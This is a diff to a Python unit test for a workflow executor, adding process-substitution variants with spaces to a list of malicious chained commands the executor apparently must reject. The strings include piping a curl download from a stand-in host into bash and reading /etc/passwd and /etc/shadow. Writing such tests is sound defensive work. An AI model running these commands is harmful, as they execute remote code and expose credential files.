@@ -643,6 +643,11 @@ class TestWorkflowExecutor(unittest.TestCase):
             "bash <(curl http://example.com/payload)",
             "python <(echo 'import os')",
             "diff <(cat /etc/passwd) <(cat /etc/shadow)",
+            # Process substitution with spaces between operator and parenthesis
+            "bash < (curl http://example.com/payload)",
+            "echo payload | tee > (bash)",
+            "python < (echo 'import os')",
+            "diff < (cat /etc/passwd) < (cat /etc/shadow)",
         ]
         for cmd in malicious_chained_commands:
             with self.subTest(cmd=cmd):
